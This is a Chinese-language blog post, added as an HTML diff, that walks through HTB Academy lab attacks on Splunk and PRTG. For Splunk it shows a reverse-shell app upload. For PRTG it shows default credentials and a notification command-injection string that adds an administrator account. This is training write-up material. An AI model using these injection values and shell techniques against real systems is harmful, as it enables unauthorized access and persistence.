@@ -1,0 +1,408 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Splunk,PRTG | Ak4izZ&#39;s 滴博客儿</title>
+  <meta name="author" content="Ak4izZ">
+  
+  <meta name="description" content="记录我在htb-academy的学习历程，这里复现了两个分析管理平台的攻击历程。一个是splunk上传脚本获取反弹shell（和tomcat部署war类似），另一个是PRTG后台的notification命令注入。"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Splunk,PRTG"/>
+  <meta property="og:site_name" content="Ak4izZ&#39;s 滴博客儿"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Ak4izZ&#39;s 滴博客儿" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Ak4izZ&#39;s 滴博客儿</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Splunk,PRTG</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>记录我在htb-academy的学习历程，这里复现了两个分析管理平台的攻击历程。一个是splunk上传脚本获取反弹shell（和tomcat部署war类似），另一个是PRTG后台的notification命令注入。</p>
+<span id="more"></span>
+
+<h1 id="Splunk"><a href="#Splunk" class="headerlink" title="Splunk"></a>Splunk</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Splunk是一款基于日志文件和机器数据的分析平台，旨在帮助用户快速获取、分析、可视化和操作大规模的机器生成数据。它可以汇集来自多个来源的数据，包括应用程序、网络设备、操作系统、传感器等，并通过搜索、报告、警报、仪表板等功能，帮助用户实现对这些数据的实时分析和监控。</p>
+<h2 id="记一个攻击利用的过程"><a href="#记一个攻击利用的过程" class="headerlink" title="记一个攻击利用的过程"></a>记一个攻击利用的过程</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/htb/splunk_shell<span class="token punctuation">]</span>
+└─$ nmap <span class="token number">10.129</span>.201.50      
+Starting Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2023</span>-05-13 <span class="token number">22</span>:13 EDT
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.129</span>.201.50
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.60s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">992</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
+PORT     STATE SERVICE
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http
+<span class="token number">135</span>/tcp  <span class="token function">open</span>  msrpc
+<span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn
+<span class="token number">445</span>/tcp  <span class="token function">open</span>  microsoft-ds
+<span class="token number">3389</span>/tcp <span class="token function">open</span>  ms-wbt-server
+<span class="token number">8000</span>/tcp <span class="token function">open</span>  http-alt
+<span class="token number">8080</span>/tcp <span class="token function">open</span>  http-proxy
+<span class="token number">8089</span>/tcp <span class="token function">open</span>  unknown
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">62.81</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>一般8000端口为应用管理后台，在老版本中，默认的登录凭证为<code>admin:changeme</code></p>
+<img src="/2023/05/15/splunk-PRTG/image-20230514102243577.png" class title="image-20230514102243577">
+
+<p>Splunk Enterprise 试用版在60天后转换为免费版，不需要认证。系统管理员安装 Splunk 试用版进行测试的情况并不少见，但随后就被人遗忘了。这将自动转换为没有任何形式身份验证的免费版本，从而在环境中引入一个安全漏洞。由于预算限制，一些组织可能会选择免费版本，因为它们没有充分理解没有用户&#x2F;角色管理的影响。</p>
+<p>一个快速获得RCE的办法无疑是创建splunk的脚本，让其运行python代码或者系统命令获得反弹shell。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0xjpuff/reverse_shell_splunk">https://github.com/0xjpuff/reverse_shell_splunk</a></p>
+<p>这是一个splunk的反弹shell项目，git下来之后修改bin目录中脚本文件的ip地址为攻击机地址</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">reverse_shell_splunk
+├── README.md
+└── reverse_shell_splunk
+    ├── bin
+    │   ├── rev.py
+    │   ├── run.bat
+    │   └── run.ps1
+    └── default
+        └── inputs.conf
+
+<span class="token number">4</span> directories, <span class="token number">5</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>修改完成后压缩成tar.gz文件，上传</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">tar</span> <span class="token parameter variable">-cvzf</span> updater.tar.gz reverse_shell_splunk 
+reverse_shell_splunk/
+reverse_shell_splunk/bin/
+reverse_shell_splunk/bin/run.bat
+reverse_shell_splunk/bin/rev.py
+reverse_shell_splunk/bin/run.ps1
+reverse_shell_splunk/default/
+reverse_shell_splunk/default/inputs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<img src="/2023/05/15/splunk-PRTG/image-20230514110659899.png" class title="image-20230514110659899">
+
+<img src="/2023/05/15/splunk-PRTG/upload_app.png" class title="img">
+
+
+
+<p>上传之前先开启nc监听，然后再upload，nc这边收到revshell</p>
+<img src="/2023/05/15/splunk-PRTG/image-20230514111254454.png" class title="image-20230514111254454">
+
+
+
+<h1 id="PRTG"><a href="#PRTG" class="headerlink" title="PRTG"></a>PRTG</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>PRTG Network Monitor 是一款用于监控网络和系统基础架构的网络监控软件。它能够监控网络设备、服务器、虚拟化、容器、应用程序、带宽等方面的性能指标，并提供实时报警、自动化告警处理和报告生成等功能。</p>
+<p>PRTG 可以通过 SNMP、WMI、SSH、HTTP、SMTP 等协议来监控各种设备和服务，并且支持定制化传感器来满足不同场景的监控需求。它还支持多种操作系统平台（如 Windows、Linux、macOS）和移动设备（如 iOS 和 Android），提供了便捷的客户端、Web 界面和移动应用程序。</p>
+<h2 id="记一个攻击利用的过程-1"><a href="#记一个攻击利用的过程-1" class="headerlink" title="记一个攻击利用的过程"></a>记一个攻击利用的过程</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># nmap -sV 10.129.201.50 -p- -T4       </span>
+Starting Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2023</span>-05-14 <span class="token number">21</span>:06 EDT
+Stats: <span class="token number">0</span>:01:06 elapsed<span class="token punctuation">;</span> <span class="token number">0</span> hosts completed <span class="token punctuation">(</span><span class="token number">1</span> up<span class="token punctuation">)</span>, <span class="token number">1</span> undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About <span class="token number">5.99</span>% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: <span class="token number">21</span>:24 <span class="token punctuation">(</span><span class="token number">0</span>:17:16 remaining<span class="token punctuation">)</span>
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.129</span>.201.50
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.73s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65503</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT      STATE    SERVICE       VERSION
+<span class="token number">80</span>/tcp    <span class="token function">open</span>     http          Microsoft IIS httpd <span class="token number">10.0</span>
+<span class="token number">135</span>/tcp   <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">139</span>/tcp   <span class="token function">open</span>     netbios-ssn   Microsoft Windows netbios-ssn
+<span class="token number">445</span>/tcp   <span class="token function">open</span>     microsoft-ds?
+<span class="token number">1799</span>/tcp  filtered netrisk
+<span class="token number">3389</span>/tcp  <span class="token function">open</span>     ms-wbt-server Microsoft Terminal Services
+<span class="token number">5985</span>/tcp  <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token number">6062</span>/tcp  filtered x11
+<span class="token number">8000</span>/tcp  <span class="token function">open</span>     ssl/http      Splunkd httpd
+<span class="token number">8089</span>/tcp  <span class="token function">open</span>     ssl/http      Splunkd httpd
+<span class="token number">8307</span>/tcp  filtered unknown
+<span class="token number">13349</span>/tcp filtered unknown
+<span class="token number">14130</span>/tcp filtered unknown
+<span class="token number">22532</span>/tcp filtered unknown
+<span class="token number">33507</span>/tcp filtered unknown
+<span class="token number">40281</span>/tcp filtered unknown
+<span class="token number">47001</span>/tcp <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token number">49664</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49665</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49666</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49667</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49668</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49669</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49670</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49671</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">50294</span>/tcp filtered unknown
+<span class="token number">50877</span>/tcp filtered unknown
+<span class="token number">52047</span>/tcp filtered unknown
+<span class="token number">59983</span>/tcp filtered unknown
+<span class="token number">60103</span>/tcp filtered unknown
+<span class="token number">60640</span>/tcp filtered unknown
+<span class="token number">65512</span>/tcp filtered unknown
+Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>一般PRTG运行在8080端口</p>
+<img src="/2023/05/15/splunk-PRTG/image-20230515090954157.png" class title="查看版本">
+
+<p>默认密码：<code>prtgadmin:prtgadmin</code></p>
+<p>密码：<code>prtgadmin:Password123</code></p>
+<img src="/2023/05/15/splunk-PRTG/image-20230515091434134.png" class title="image-20230515091434134">
+
+<p>处于<a target="_blank" rel="noopener" href="https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/">漏洞</a>范围之内。</p>
+<p>登录之后在账户设置里面新建一个notification</p>
+<img src="/2023/05/15/splunk-PRTG/image-20230515161651005.png" class title="image-20230515161651005">
+
+<p>在下方的选项中选择执行程序，使用ps脚本</p>
+<img src="/2023/05/15/splunk-PRTG/image-20230515161922984.png" class title="image-20230515161922984">
+
+<p> <code>test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add</code>进行命令注入，会添加一个新用户。添加完成之后点击test</p>
+<img src="/2023/05/15/splunk-PRTG/image-20230515163112721.png" class title="image-20230515163112721">
+
+<p>验证用户添加</p>
+<img src="/2023/05/15/splunk-PRTG/image-20230515163242397.png" class title="image-20230515163242397">
+
+<p>然后用xfreerdp远程登录就行了</p>
+<img src="/2023/05/15/splunk-PRTG/image-20230515163834953.png" class title="image-20230515163834953">
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/04/30/关于Tomcat/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-05-15 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/web/">web<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Splunk"><span class="toc-article-text">Splunk</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-article-text">简介</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%AE%B0%E4%B8%80%E4%B8%AA%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-article-text">记一个攻击利用的过程</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#PRTG"><span class="toc-article-text">PRTG</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-article-text">简介</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%AE%B0%E4%B8%80%E4%B8%AA%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B-1"><span class="toc-article-text">记一个攻击利用的过程</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 Ak4izZ's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
